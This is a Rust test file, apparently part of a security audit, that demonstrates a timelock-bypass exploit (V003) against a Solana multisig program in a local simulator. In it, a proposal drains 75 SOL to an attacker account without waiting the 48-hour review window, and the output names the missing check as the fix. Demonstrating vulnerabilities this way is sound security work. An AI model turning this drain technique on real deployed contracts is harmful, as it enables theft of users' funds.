// Exploit: Timelock Bypass (Missing Timelock Enforcement)
//
// Vulnerability: V003 - The execute_transfer_proposal instruction does not validate
// that the proposal has waited the required timelock duration before execution.
//
// Attack: Member creates proposal and executes immediately without waiting for
// the safety review window, bypassing the timelock security mechanism.
//
// Result: Timelock protection nullified - malicious proposals execute instantly
// without giving other members time to review and potentially cancel.

mod utils;

use utils::*;

use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    native_token::LAMPORTS_PER_SOL,
    signature::Signer,
    transaction::Transaction,
};

#[test]
fn test_exploit_timelock_bypass() {
    println!("\n=== EXPLOIT TEST: Timelock Bypass (V003) ===\n");
    println!("[Scenario] Attacker executes proposal before timelock expires");

    let timelock_seconds = 48 * 3600; // 48 hours
    let mut scenario = setup_multisig_scenario(1, timelock_seconds);

    println!("[Setup] Creating multisig with 48-hour timelock...");

    // Create multisig with 1 member threshold but 48-hour timelock for security
    let owners = vec![
        (scenario.creator.pubkey(), MemberRole::Admin),
        (scenario.member1.pubkey(), MemberRole::Proposer),
        (scenario.member2.pubkey(), MemberRole::Executor),
    ];

    create_multisig_with_owners(
        &mut scenario.svm,
        &scenario.creator,
        &scenario.multisig_pda,
        &scenario.vault_pda,
        scenario.multisig_id,
        1, // threshold
        timelock_seconds, // 48 hour timelock
        &owners,
    );

    println!("[Setup] Multisig created with 48-hour timelock for proposal review");

    // Fund the vault
    println!("[Setup] Funding vault with 75 SOL...");
    fund_vault(
        &mut scenario.svm,
        &scenario.vault_pda,
        75 * LAMPORTS_PER_SOL,
    );

    let vault_balance = scenario.svm.get_account(&scenario.vault_pda)
        .expect("Vault should exist")
        .lamports;
    println!("[Setup] Vault balance: {} SOL", vault_balance / LAMPORTS_PER_SOL);

    // Malicious member creates proposal at time T=0
    println!("\n[Attack] Member1 creates malicious proposal at T=0...");

    // Get current proposal_count to derive correct PDA
    let proposal_count = get_multisig_proposal_count(&scenario.svm, &scenario.multisig_pda);
    let (transfer_proposal_pda, _) =
        derive_transfer_proposal_pda(&scenario.multisig_pda, proposal_count);

    // Get current time
    let clock: solana_sdk::clock::Clock = scenario.svm.get_sysvar();
    let creation_time = clock.unix_timestamp;
    println!("[Attack] Proposal created at timestamp: {}", creation_time);

    let create_transfer_ix = build_create_transfer_proposal_ix(
        &scenario.member1.pubkey(),
        &scenario.multisig_pda,
        &transfer_proposal_pda,
        75 * LAMPORTS_PER_SOL,
        &scenario.attacker.pubkey(),
    );

    send_tx_expect_success(
        &mut scenario.svm,
        create_transfer_ix,
        &scenario.member1,
        &[&scenario.member1],
    );

    println!("[Attack] Proposal created (auto-approved by proposer)");
    println!("[Attack] Timelock requires waiting until T={}", creation_time + timelock_seconds as i64);

    // EXPLOIT: Try to execute immediately without waiting for timelock
    println!("\n[Attack] Member2 tries to execute IMMEDIATELY (T=0, only 1 second later)...");

    // Advance time by only 1 second (not 48 hours!)
    advance_time(&mut scenario.svm, 1);

    let clock_after: solana_sdk::clock::Clock = scenario.svm.get_sysvar();
    println!("[Attack] Current timestamp: {} (timelock not satisfied!)", clock_after.unix_timestamp);
    println!("[Attack] Time elapsed: 1 second / {} seconds required", timelock_seconds);

    let attacker_balance_before = scenario.svm.get_account(&scenario.attacker.pubkey())
        .expect("Attacker account should exist")
        .lamports;

    let execute_ix_data = build_execute_transfer_proposal_data();

    let execute_ix = Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(scenario.member2.pubkey(), true), // executor
            AccountMeta::new(scenario.multisig_pda, false),    // multisig_account
            AccountMeta::new(transfer_proposal_pda, false),    // transfer_proposal
            AccountMeta::new(scenario.vault_pda, false),       // vault
            AccountMeta::new(scenario.attacker.pubkey(), false), // recipient
            AccountMeta::new_readonly(solana_system_interface::program::ID, false), // system_program
        ],
        data: execute_ix_data,
    };

    let execute_tx = Transaction::new_signed_with_payer(
        &[execute_ix],
        Some(&scenario.member2.pubkey()),
        &[&scenario.member2],
        scenario.svm.latest_blockhash(),
    );

    let result = scenario.svm.send_transaction(execute_tx);

    match result {
        Ok(metadata) => {
            println!("[VULNERABLE] Execution succeeded WITHOUT waiting for timelock!");
            println!("[Result] Compute units: {}", metadata.compute_units_consumed);

            let attacker_balance_after = scenario.svm.get_account(&scenario.attacker.pubkey())
                .expect("Attacker account should exist")
                .lamports;

            println!("[EXPLOIT SUCCESS] Attacker balance increased by: {} SOL",
                (attacker_balance_after - attacker_balance_before) / LAMPORTS_PER_SOL);
            println!("[EXPLOIT SUCCESS] Executed instantly without 48-hour review window");
            println!("[EXPLOIT SUCCESS] Other members had NO TIME to review and cancel");

            println!("\n[Analysis] The vulnerable code is missing this check:");
            println!("           let current_time = Clock::get()?.unix_timestamp as u64;");
            println!("           let time_elapsed = current_time - self.transfer_proposal.created_at;");
            println!("           require!(");
            println!("               time_elapsed >= self.multisig_account.timelock_seconds,");
            println!("               MultisigError::TimelockNotMet");
            println!("           );");
        }
        Err(e) => {
            println!("[Result] Execution failed: {:?}", e);
            println!("[Analysis] Expected to succeed due to missing timelock check");

            let meta = &e.meta;

               println!("[Analysis] Logs:");

               for log in &meta.logs {
                     println!("           {}", log);
               }
        }
    }

    println!("\n=== END: Timelock Bypass Exploit ===\n");
}
